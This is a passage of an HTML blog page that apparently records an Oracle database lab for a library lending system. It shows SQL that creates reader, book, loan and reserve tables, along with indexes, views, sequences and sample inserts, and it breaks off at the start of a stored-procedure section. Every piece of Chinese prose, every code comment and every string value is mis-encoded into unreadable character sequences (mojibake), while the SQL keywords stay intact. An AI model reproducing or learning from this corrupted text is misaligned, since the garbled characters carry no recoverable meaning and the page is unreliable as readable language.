ç¨‹åºï¼Œåœ¨ Library_DBA æ–¹æ¡ˆä¸­ï¼Œåˆ›å»º Lib æ•°æ®åº“çš„è¡¨ã€è§†å›¾ã€ç´¢å¼•ã€åºåˆ—ç­‰å¯¹è±¡ã€‚</li><li>åœ¨ Library_DBA æ–¹æ¡ˆä¸­ï¼Œå¯¹æ•°æ®åº“è¡¨è¿›è¡Œæ•°æ®æ’å…¥ã€æ•°æ®ä¿®æ”¹ã€æ•°æ®åˆ é™¤ SQL æ“ä½œã€‚</li><li>åœ¨ Library_DBA æ–¹æ¡ˆä¸­ï¼Œå¯¹æ•°æ®åº“è¡¨è¿›è¡Œæ•°æ®æŸ¥è¯¢ã€æ•°æ®ç»Ÿè®¡ SQL æ“ä½œ</li></ul><h3 id="å®éªŒè¿‡ç¨‹-1"><a href="#å®éªŒè¿‡ç¨‹-1" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h3><h4 id="åˆ›å»ºæ–¹æ¡ˆå¯¹è±¡"><a href="#åˆ›å»ºæ–¹æ¡ˆå¯¹è±¡" class="headerlink" title="åˆ›å»ºæ–¹æ¡ˆå¯¹è±¡"></a>åˆ›å»ºæ–¹æ¡ˆå¯¹è±¡</h4><p>åœ¨navicatä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œç‚¹å‡»ç”¨æˆ·ï¼Œé€‰æ‹©æ–°å»ºç”¨æˆ·ï¼Œæœäº†ä¸€ä¸‹åˆ›å»ºæŠ¥é”™å…¬å…±ç”¨æˆ·åæˆ–è§’è‰²æ— æ•ˆçš„è§£å†³æ–¹æ³•å°±æ˜¯åœ¨ç”¨æˆ·åå‰åŠ <code>C##</code>äº‹å®ä¸Šä¹Ÿç¡®å®åˆ›å»ºæˆåŠŸäº†<code>C##LIBRARY_DBA</code></p><h5 id="è®¾ç½®æœåŠ¡å™¨æƒé™"><a href="#è®¾ç½®æœåŠ¡å™¨æƒé™" class="headerlink" title="è®¾ç½®æœåŠ¡å™¨æƒé™"></a>è®¾ç½®æœåŠ¡å™¨æƒé™</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113223829390.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113223816027.png" alt="image-20231113223816027" style="zoom: 50%;" /><h5 id="ç”¨åˆšæ‰åˆ›å»ºçš„ç”¨æˆ·ç™»å½•"><a href="#ç”¨åˆšæ‰åˆ›å»ºçš„ç”¨æˆ·ç™»å½•" class="headerlink" title="ç”¨åˆšæ‰åˆ›å»ºçš„ç”¨æˆ·ç™»å½•"></a>ç”¨åˆšæ‰åˆ›å»ºçš„ç”¨æˆ·ç™»å½•</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231113235436241.png" alt="image-20231113235436241" style="zoom:50%;" /><p>æ³¨æ„ç‚¹å‡»é«˜çº§ï¼Œé€‰æ‹©è§’è‰²ä¸ºdefault</p><h4 id="ç¼–å†™SQLè¯­å¥"><a href="#ç¼–å†™SQLè¯­å¥" class="headerlink" title="ç¼–å†™SQLè¯­å¥"></a>ç¼–å†™SQLè¯­å¥</h4><p>åœ¨ Library_DBA ç©ºé—´ä¸­è®¾è®¡å¹¶ç¼–å†™ sql ç¨‹åºï¼Œä½¿å…¶åˆ›å»ºå‡ºåä¸ºreader\employee\title\book\loan\reserve çš„äº”ä¸ªè¡¨ã€‚è®¾è®¡è¡¨æ—¶æ³¨æ„è¡¨ä¹‹é—´çš„çº¦æŸå…³ç³»ï¼Œé˜²æ­¢è¡¨åˆ›å»ºä¸æˆåŠŸã€‚åˆ›å»ºçš„å…ˆåé¡ºåºä¸ºï¼šreader\title è¡¨ï¼Œå† book è¡¨ï¼Œæœ€å loan\reserve è¡¨ã€‚ä½¿ç”¨ <code>create</code>å…³é”®å­—è¿›è¡Œåˆ›å»ºã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114005306564.png" alt="image-20231114005306564" style="zoom: 33%;" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--åˆ›å»ºå€Ÿé˜…è€…ä¿¡æ¯è¡¨</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> reader (</span><br><span class="line">Read_ID <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">primary</span> key,</span><br><span class="line">Read_Name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Read_Addr <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">null</span>,</span><br><span class="line">Read_Tel <span class="type">varchar</span>(<span class="number">11</span>) <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">--åˆ›å»ºå‘˜å·¥ä¿¡æ¯è¡¨EMPLOYEE</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> EMPLOYEE (</span><br><span class="line">Empl_ID <span class="type">char</span>(<span class="number">4</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">Empl_Name <span class="type">Varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Empl_Gender <span class="type">char</span>(<span class="number">2</span>) <span class="keyword">NULL</span>,</span><br><span class="line">Empl_Birthday <span class="type">Date</span> <span class="keyword">NULL</span>,</span><br><span class="line">Empl_Tel <span class="type">varchar</span>(<span class="number">11</span>) <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">--åˆ›å»ºå›¾ä¹¦ç›®å½•TITTLE</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> TITLE (</span><br><span class="line">Titl_ID Number GENERATED <span class="keyword">AS</span> <span class="keyword">IDENTITY</span>,</span><br><span class="line">Titl_Name <span class="type">varchar</span>(<span class="number">80</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Titl_Type <span class="type">Varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Titl_PK <span class="keyword">PRIMARY</span> KEY(Titl_ID)</span><br><span class="line">);</span><br><span class="line"><span class="comment">--åˆ›å»ºå›¾ä¹¦ä¿¡æ¯è¡¨BOOK</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> BOOK(</span><br><span class="line">Book_ID NUMBER GENERATED <span class="keyword">AS</span> <span class="keyword">IDENTITY</span>,</span><br><span class="line">Book_Name <span class="type">Varchar</span>(<span class="number">80</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Book_ISBN <span class="type">Char</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">BOOK_Title Number <span class="keyword">null</span>,</span><br><span class="line">Book_Author <span class="type">varchar</span>(<span class="number">60</span>) <span class="keyword">NULL</span>,</span><br><span class="line">Book_PubDate <span class="type">Date</span> <span class="keyword">NULL</span>,</span><br><span class="line">Book_Money <span class="type">DECIMAL</span>(<span class="number">4</span>,<span class="number">1</span>) <span class="keyword">NULL</span>,</span><br><span class="line">Book_Inlf <span class="type">SmallInt</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Book_PK <span class="keyword">PRIMARY</span> key(Book_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Book_FK <span class="keyword">FOREIGN</span> KEY(Book_Title) <span class="keyword">REFERENCES</span> TITLE(Titl_ID)</span><br><span class="line">);</span><br><span class="line"><span class="comment">--åˆ›å»ºå€Ÿé˜…è®°å½•è¡¨LOAN</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> LOAN(</span><br><span class="line">Loan_ID NUMBER  GENERATED <span class="keyword">AS</span> <span class="keyword">IDENTITY</span>,</span><br><span class="line">Loan_Type <span class="type">char</span>(<span class="number">2</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Loan_BookID number <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Loan_ReaderID <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Loan_Date <span class="type">Date</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Loan_Note <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Loan_PK <span class="keyword">PRIMARY</span> key(Loan_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Loan_FK1 <span class="keyword">FOREIGN</span> KEY(Loan_BookID) <span class="keyword">REFERENCES</span> BOOK(Book_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Loan_FK2 <span class="keyword">FOREIGN</span> KEY(Loan_ReaderID) <span class="keyword">REFERENCES</span> READER(Read_ID)</span><br><span class="line">);</span><br><span class="line"><span class="comment">--åˆ›å»ºé¢„å®šå›¾ä¹¦è¡¨RESERVE</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> RESERVE(</span><br><span class="line">Rese_ID number GENERATED <span class="keyword">AS</span> <span class="keyword">IDENTITY</span>,</span><br><span class="line">Rese_BookID number <span class="keyword">NOT</span> <span class="keyword">null</span>,</span><br><span class="line">Rese_ReaderID <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Rese_Date <span class="type">date</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Rese_Note <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Rese_PK <span class="keyword">PRIMARY</span> key(Rese_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Rese_FK1 <span class="keyword">FOREIGN</span> KEY(Rese_BookID) <span class="keyword">REFERENCES</span> BOOK(Book_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Rese_FK2 <span class="keyword">FOREIGN</span> KEY(Rese_ReaderID) <span class="keyword">REFERENCES</span> READER(Read_ID)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºç´¢å¼•"><a href="#åˆ›å»ºç´¢å¼•" class="headerlink" title="åˆ›å»ºç´¢å¼•"></a>åˆ›å»ºç´¢å¼•</h4><ol><li>ç´¢å¼•æ˜¯ä»€ä¹ˆï¼Ÿ<br>(1) ä¸€ç§ä¾›æœåŠ¡å™¨åœ¨è¡¨ä¸­å¿«é€ŸæŸ¥æ‰¾ä¸€è¡Œçš„ â€˜æ•°æ®åº“ç»“æ„â€™<br>(2) å¯ä»¥ç†è§£ä¸ºï¼šä¸€æœ¬ä¹¦ä¸­çš„ â€˜ç›®å½•â€™<ol start="2"><li>ç´¢å¼•çš„ä¼˜ç‚¹<br>(1) åŠ å¿«æ•°æ®çš„ â€˜æ£€ç´¢é€Ÿåº¦â€™<br>(2) å¯ä»¥ä¿è¯åˆ—å€¼çš„ â€˜å”¯ä¸€æ€§â€™ï¼ˆuniqueã€ä¸»é”®ï¼‰<br>(3) å®ç°è¡¨ä¸è¡¨ä¹‹é—´çš„ â€˜å‚ç…§å®Œæ•´æ€§â€™ï¼ˆå¤–é”®ï¼‰<br>(4) åœ¨ä½¿ç”¨ order byã€group by å­å¥æ—¶ï¼Œå¯ä»¥å‡å°‘æ’åºå’Œåˆ†ç»„çš„æ—¶é—´</li></ol></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--åœ¨å›¾ä¹¦è¡¨ä¸­ï¼Œåˆ›å»ºä¹¦ååˆ—ç´¢å¼•Book_Name_Idx</span></span><br><span class="line"><span class="keyword">create</span> index Book_Name_Idx <span class="keyword">on</span> BOOK(Book_Name);</span><br><span class="line"><span class="comment">--åœ¨å›¾ä¹¦è¡¨ä¸­ï¼Œåˆ›å»ºä¹¦ç›®åˆ—ç´¢å¼•Book_Title_Idx</span></span><br><span class="line"><span class="keyword">create</span> INDEX Book_Title_Idx <span class="keyword">on</span> BOOK(Book_Title);</span><br><span class="line"><span class="comment">--åœ¨å€Ÿé˜…è®°å½•è¡¨ä¸­ï¼Œåˆ›å»ºå€Ÿè¿˜ç±»å‹ç´¢å¼•Loan_Type_Idx</span></span><br><span class="line"><span class="keyword">create</span> BITMAP index Loan_Type_Idx <span class="keyword">on</span> LOAN(Loan_Type);</span><br><span class="line"><span class="comment">--åœ¨å€Ÿé˜…è®°å½•è¡¨ä¸­ï¼Œåˆ›å»ºæ—¥æœŸåˆ—ç´¢å¼•Loan_Date_Idx</span></span><br><span class="line"><span class="keyword">create</span> index Loan_Date_Idx <span class="keyword">on</span> LOAN(Loan_Date <span class="keyword">DESC</span>);</span><br><span class="line"><span class="comment">--åœ¨å›¾ä¹¦é¢„å®šè¡¨ä¸­ï¼Œåˆ›å»ºæ—¥æœŸåˆ—ç´¢å¼• Rese_Date_idx</span></span><br><span class="line"><span class="keyword">create</span> index Rese_Date_Idx <span class="keyword">on</span> RESERVE(Rese_Date <span class="keyword">DESC</span>);</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114011645584.png" alt="image-20231114011645584" style="zoom: 33%;" /><h4 id="åˆ›å»ºè§†å›¾å¯¹è±¡"><a href="#åˆ›å»ºè§†å›¾å¯¹è±¡" class="headerlink" title="åˆ›å»ºè§†å›¾å¯¹è±¡"></a>åˆ›å»ºè§†å›¾å¯¹è±¡</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--åˆ›å»ºæŸ¥è¯¢å½“å‰å¯å€Ÿå›¾ä¹¦è§†å›¾Book_Inlf_View</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> Book_Inlf_View <span class="keyword">as</span> <span class="keyword">select</span> Book_Name,Book_ISBN,Book_Inlf <span class="keyword">from</span> BOOK <span class="keyword">where</span> Book_Inlf <span class="operator">=</span> <span class="number">1</span>; <span class="comment">--0ä»£è¡¨ä¸å¯å€Ÿï¼Œ1ä»£è¡¨å¯ä»¥å€Ÿ</span></span><br><span class="line"><span class="comment">--åˆ›å»ºæŸ¥è¯¢å½“å‰å€Ÿä¹¦è¯»è€…åˆ—è¡¨è§†å›¾Loan_Reader_View</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> Loan_Reader_View <span class="keyword">as</span> <span class="keyword">select</span> R.READ_ID,R.Read_Name,B.Book_Name,L.Loan_Date <span class="keyword">from</span> LOAN L,READER R,BOOK B <span class="keyword">where</span> L.Loan_Type <span class="operator">=</span> <span class="string">&#x27;å€Ÿ&#x27;</span> <span class="keyword">and</span> L.loan_BookID <span class="operator">=</span> B.Book_ID <span class="keyword">and</span> L.Loan_ReaderID <span class="operator">=</span> r.Read_ID <span class="keyword">with</span> READ <span class="keyword">ONLY</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114012402556.png" alt="image-20231114012402556" style="zoom:33%;" /><h4 id="åˆ›å»ºåºåˆ—å¯¹è±¡"><a href="#åˆ›å»ºåºåˆ—å¯¹è±¡" class="headerlink" title="åˆ›å»ºåºåˆ—å¯¹è±¡"></a>åˆ›å»ºåºåˆ—å¯¹è±¡</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--åœ¨Library_DBAç”¨æˆ·æ–¹æ¡ˆä¸­ï¼Œåˆ›å»ºåºåˆ—Titl_ID_Seq</span></span><br><span class="line"><span class="keyword">create</span> sequence Titl_ID_Seq <span class="keyword">start</span> <span class="keyword">with</span> <span class="number">1</span> increment <span class="keyword">by</span> <span class="number">10</span>;</span><br><span class="line"><span class="comment">--åœ¨Library_DBAç”¨æˆ·æ–¹æ¡ˆä¸­ï¼Œåˆ›å»ºåºåˆ—Book_ID_Seq</span></span><br><span class="line"><span class="keyword">create</span> sequence Book_ID_Seq <span class="keyword">start</span> <span class="keyword">with</span> <span class="number">1000</span> increment <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">--åœ¨Library_DBAç”¨æˆ·æ–¹æ¡ˆä¸­ï¼Œåˆ›å»ºåºåˆ—Rese_ID_Seq</span></span><br><span class="line"><span class="keyword">create</span> sequence Rese_ID_Seq;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114012718020.png" alt="image-20231114012718020" style="zoom:33%;" /><h4 id="ä¿®æ”¹è¡¨å¯¹è±¡ç»“æ„"><a href="#ä¿®æ”¹è¡¨å¯¹è±¡ç»“æ„" class="headerlink" title="ä¿®æ”¹è¡¨å¯¹è±¡ç»“æ„"></a>ä¿®æ”¹è¡¨å¯¹è±¡ç»“æ„</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> C##LIBRARY_DBA.reader <span class="keyword">add</span> read_birthday <span class="type">date</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114015000998.png" alt="image-20231114015000998" style="zoom:33%;" /><h4 id="åˆ é™¤æ•°æ®åº“åºåˆ—"><a href="#åˆ é™¤æ•°æ®åº“åºåˆ—" class="headerlink" title="åˆ é™¤æ•°æ®åº“åºåˆ—"></a>åˆ é™¤æ•°æ®åº“åºåˆ—</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> sequence Rese_id_seq;</span><br></pre></td></tr></table></figure><h4 id="æ’å…¥æ•°æ®"><a href="#æ’å…¥æ•°æ®" class="headerlink" title="æ’å…¥æ•°æ®"></a>æ’å…¥æ•°æ®</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;510111111111111111&#x27;</span>,<span class="string">&#x27;p1ych&#x27;</span>,<span class="string">&#x27;æˆéƒ½&#x27;</span>,<span class="string">&#x27;18788881881&#x27;</span>,to_date(<span class="string">&#x27;2010-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;520111111111111111&#x27;</span>,<span class="string">&#x27;p2ych&#x27;</span>,<span class="string">&#x27;é•¿åº¦&#x27;</span>,<span class="string">&#x27;18788388882&#x27;</span>,to_date(<span class="string">&#x27;2011-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;530111111111111111&#x27;</span>,<span class="string">&#x27;p3ych&#x27;</span>,<span class="string">&#x27;æˆéƒ½&#x27;</span>,<span class="string">&#x27;18788848883&#x27;</span>,to_date(<span class="string">&#x27;2012-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;540111111111111111&#x27;</span>,<span class="string">&#x27;p4ych&#x27;</span>,<span class="string">&#x27;æŸ¥åˆ°&#x27;</span>,<span class="string">&#x27;18788885884&#x27;</span>,to_date(<span class="string">&#x27;2013-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;550111111111111111&#x27;</span>,<span class="string">&#x27;p5ych&#x27;</span>,<span class="string">&#x27;ç¨‹åº¦&#x27;</span>,<span class="string">&#x27;18788883885&#x27;</span>,to_date(<span class="string">&#x27;2014-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;560111111111111111&#x27;</span>,<span class="string">&#x27;p6ych&#x27;</span>,<span class="string">&#x27;å½»åº•&#x27;</span>,<span class="string">&#x27;18788883886&#x27;</span>,to_date(<span class="string">&#x27;2015-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;570111111111111111&#x27;</span>,<span class="string">&#x27;p7ych&#x27;</span>,<span class="string">&#x27;å‡ºçš„&#x27;</span>,<span class="string">&#x27;18788882887&#x27;</span>,to_date(<span class="string">&#x27;2016-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;580111111111111111&#x27;</span>,<span class="string">&#x27;p8ych&#x27;</span>,<span class="string">&#x27;é”™çš„&#x27;</span>,<span class="string">&#x27;18788884888&#x27;</span>,to_date(<span class="string">&#x27;2017-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;590111111111111111&#x27;</span>,<span class="string">&#x27;p9ych&#x27;</span>,<span class="string">&#x27;æˆç”µ&#x27;</span>,<span class="string">&#x27;18788882889&#x27;</span>,to_date(<span class="string">&#x27;2018-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;500111111111111111&#x27;</span>,<span class="string">&#x27;p0ych&#x27;</span>,<span class="string">&#x27;æŠ„çš„&#x27;</span>,<span class="string">&#x27;18788882880&#x27;</span>,to_date(<span class="string">&#x27;2019-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114020655314.png" alt="image-20231114020655314" style="zoom: 33%;" /><h2 id="å®éªŒä¸‰ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle-æ•°æ®åº“åç«¯-PL-SQL-ç¼–ç¨‹"><a href="#å®éªŒä¸‰ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle-æ•°æ®åº“åç«¯-PL-SQL-ç¼–ç¨‹" class="headerlink" title="å®éªŒä¸‰ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle æ•°æ®åº“åç«¯ PL&#x2F;SQL ç¼–ç¨‹"></a>å®éªŒä¸‰ï¼šâ€œå›¾ä¹¦å€Ÿé˜…ç®¡ç†ç³»ç»Ÿâ€Oracle æ•°æ®åº“åç«¯ PL&#x2F;SQL ç¼–ç¨‹</h2><h3 id="å®éªŒåŸç†-2"><a href="#å®éªŒåŸç†-2" class="headerlink" title="å®éªŒåŸç†"></a>å®éªŒåŸç†</h3><p>é€šè¿‡ PL&#x2F;SQL ç¼–ç¨‹å®ç°å›¾ä¹¦å€Ÿé˜…æ•°æ®åº“ Libçš„åç«¯æ•°æ®å¤„ç†åŠŸèƒ½ã€‚é€šè¿‡ PL&#x2F;SQL ç¼–ç¨‹ï¼Œåç«¯ä¸»è¦çš„æ•°æ®å¤„ç†åŠŸèƒ½åŒ…æ‹¬äº†æ•°æ®åº“å­˜å‚¨å¯¹è±¡çš„åˆ›å»ºã€å­˜å‚¨è¿‡ç¨‹æŸ¥çœ‹ã€ä»£ç ä¿®æ”¹ã€ä»£ç ç¼–è¯‘ã€ç¼–ç¨‹è°ƒç”¨ã€å­˜å‚¨è¿‡ç¨‹ç»“æœåˆ é™¤ï¼›ä»¥åŠæ•°æ®åº“è§¦å‘å™¨çš„åˆ›å»ºã€å­˜å‚¨è¿‡ç¨‹æŸ¥çœ‹ã€ä»£ç ä¿®æ”¹ã€ä»£ç ç¼–è¯‘ã€ç¼–ç¨‹è°ƒç”¨ã€å­˜å‚¨è¿‡ç¨‹ç»“æœåˆ é™¤ã€‚</p><h3 id="å®éªŒæ­¥éª¤-2"><a href="#å®éªŒæ­¥éª¤-2" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h3><ul><li>å­˜å‚¨è¿‡ç¨‹ç¼–ç¨‹ä¸å¯¹è±¡åˆ›å»º</li><li>å­˜å‚¨è¿‡ç¨‹æŸ¥çœ‹ã€ä»£ç ä¿®æ”¹ã€ä»£ç ç¼–è¯‘</li><li>ç¼–å†™PL&#x2F;SQLä¸»ç¨‹åºè°ƒç”¨å­˜å‚¨è¿‡ç¨‹æ‰§è¡Œ</li><li>å­˜å‚¨è¿‡ç¨‹åˆ é™¤</li><li>è§¦å‘å™¨ç¼–ç¨‹ä¸åˆ›å»º</li><li>è§¦å‘å™¨æŸ¥çœ‹ã€ä»£ç ä¿®æ”¹ã€ä»£ç ç¼–è¯‘</li><li>è§¦å‘å™¨åº”ç”¨</li><li>è§¦å‘å™¨ä½¿èƒ½æ§åˆ¶</li><li>è§¦å‘å™¨åˆ é™¤</li></ul><h3 id="å®éªŒè¿‡ç¨‹-2"><a href="#å®éªŒè¿‡ç¨‹-2" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h3><h4 id="å­˜å‚¨è¿‡ç¨‹ç¼–ç¨‹"><a href="#å­˜å‚¨è¿‡ç¨‹ç¼–ç¨‹" class="headerlink" title="å­˜å‚¨è¿‡ç¨‹ç¼–ç¨‹"></a>å­˜å‚¨è¿‡ç¨‹ç¼–ç¨‹</h4><h5 id="å­˜å‚¨è¿‡ç¨‹åˆ›å»º"><a href="#å­˜å‚¨è¿‡ç¨‹åˆ›å»º" class="headerlink" title="å­˜å‚¨è¿‡ç¨‹åˆ›å»º"></a>å­˜å‚¨è¿‡ç¨‹åˆ›å»º</h5><p>åœ¨Library_DBAæ–¹æ¡ˆä¸‹ï¼Œç¼–ç¨‹å¹¶åˆ›å»ºåä¸ºCHANGE_PHONEçš„å­˜å‚¨è¿‡ç¨‹ã€‚è¯¥å­˜å‚¨è¿‡ç¨‹å°†è¿›è¡ŒReaderèº«ä»½ä¿¡æ¯çš„ç¡®è®¤ã€‚å¦‚æœReaderçš„idå’Œphoneæ­£ç¡®,åˆ™è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ï¼Œå¦åˆ™ï¼Œå°†æ‹’ç»ä¿®æ”¹ï¼Œå¹¶è¾“å‡ºç›¸åº”é”™è¯¯æç¤ºä¿¡æ¯ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 